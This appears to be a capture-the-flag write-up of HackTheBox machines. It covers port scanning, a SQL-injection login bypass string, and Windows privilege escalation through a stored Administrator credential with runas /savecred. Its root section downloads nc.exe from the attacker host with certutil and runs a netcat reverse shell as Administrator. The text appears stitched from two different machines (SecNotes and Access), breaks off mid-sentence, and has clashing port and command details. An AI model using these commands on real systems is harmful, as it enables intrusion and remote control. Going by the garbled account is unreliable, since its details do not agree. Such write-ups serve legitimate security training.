*Note: I completed this challenge on December 25th, 2018, however I'm just now writing it up in December 2019. As such, some of the details are sparse.*

## User
To begin the enumeration process, a port scan was run against the target using `masscan`. The purpose of this initial scan is to quickly determine which ports are open so that a more focused `nmap` scan can be performed that will target only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Access# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.97
```

From `masscan`, it was revealed that TCP 8808, 80 (HTTP), and 8808 were listening for connections. Using this information, a second scan was run using `nmap` to more thoughoughly examine the services listening on the discovered ports.

```
root@kali:~/workspace/hackthebox/Access# nmap -p 8808,80,445 -sC -sV -oA scans/discovered-tcp 10.10.10.97 
```

As expected, the service listening on port 445 is SMB and the service listening on port 80 is Microsoft IIS HTTP. The resuts of the nmap scan suggests that the service lisetning on port 8808 is a Microsoft IIS HTTP service as well. The results of the nmap scan are shown below.

Browsing to `http://10.10.10.97` contains a simple login page with an option to sign up for an account. The `login.php` index file hints that the server runs PHP code.

![login_page.png](/assets/images/htb/secnotes/login_page.png)

Browsing to `http://10.10.10.97:8808` unveils only the default Microsoft IIS page. The directory-busting tool `gobuster` was run at this time to enumerate any additional directories present on port 8808. The command to accomplish this is shown below.

```
root@kali:~/workspace/hackthebox/SecNotes# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.97:80
```

No additional directoriess were found as a result of the `gobuster` command.

While the `gobuster` tool was doing its work, an attempt to connect to to the SMB service on port 445 was made using the `smbclient` command shown below.

```
root@kali:~/workspace/hackthebox/SecNotes# smbclient -L //10.10.10.97
```

This command aims to list the SMB shares, however the server did not allow for passwordless access in this case.

Continuing on with the page found at `http://10.10.10.97`, a new user account was created, as shown below.

![new_account.png](/assets/images/htb/secnotes/new_account.png)

Upon logging into the newly created account, the page shown below is reached. The basic page functionality is demonstrated.

Moving back to the login page, basic SQL injection can be tested. If user data is not sanitized with a SQL querty, then sometimes login restrictions can be bypassed. A basic SQL injection string is shown below.

```
username' OR 1=1#
```



Similar to another HackTheBox machine, Nightmare, the login page for SecNotes suffers from a form of SQL injection where a user 

## Root
While running through the usual privelege escalation enumeration commands, something stood out as odd. After running the `net users administrator` command, it was revealed that the "Password Not Required" property has been set for the Administrator user. This means that the Administrator user is allowed passwordless logon to the system.

![net_user](/assets/images/htb/access/net_user.png)

Investigating this property further with the Windows `cmdkey /list` command, it can be seen that the Administrator user has a stored credential on the system.

![cmdkey](/assets/images/htb/access/cmdkey.png)

Continuing enumeration, the `ZKAccess3.5 Security System.lnk` shortcut file found on the Public user's desktop suggests that commands can be run as the Administrator using the `runas` Windows command along with the `/savecred` flag. The `runas` command can be used to run a Windows command as another system user. 

![savecred_link](/assets/images/htb/access/savecred_link.png)

Putting these pieces together, it is clear that system commands can be run as the Administrator user if the `/savecred` flag is included as part of the `runas` command. The fact that the Administrator does not need a password to logon to the system, that the Administrator user has a stored credential on the system, and that the `runas` command with the `/savecred` flag is being used on the system suggests a possible privelege elevation scenario.

To leverage this situtation, `nc.exe` can be transferred to the target system and then used to obtain a reverse shell that connects to the attacking machine.

In this case, the `certutil` Windows tool is used on the target system to download `nc.exe`to the target system. After using Python's `SimpleHTTPServer` to host `nc.exe` on the attacking system, the `certutil` command shown below was run on the target system to download the `nc` executable to the system.

```
C:\Users\security\Music>certutil.exe -urlcache -split -f http://10.10.14.2/nc.exe nc.exe
```

A screenshot of this process is included below.

![cert_util](/assets/images/htb/access/cert_util.png)

With `nc.exe` on the target system and a `nc` listener listening on the attacking system, the command shown below was run on the target system to create a reverse shell connection to the attacking system.

```
C:\Users\security\Music>runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.14.2 4444"
```

From the connection received on the attacking system, the `root.txt` flag can be read.
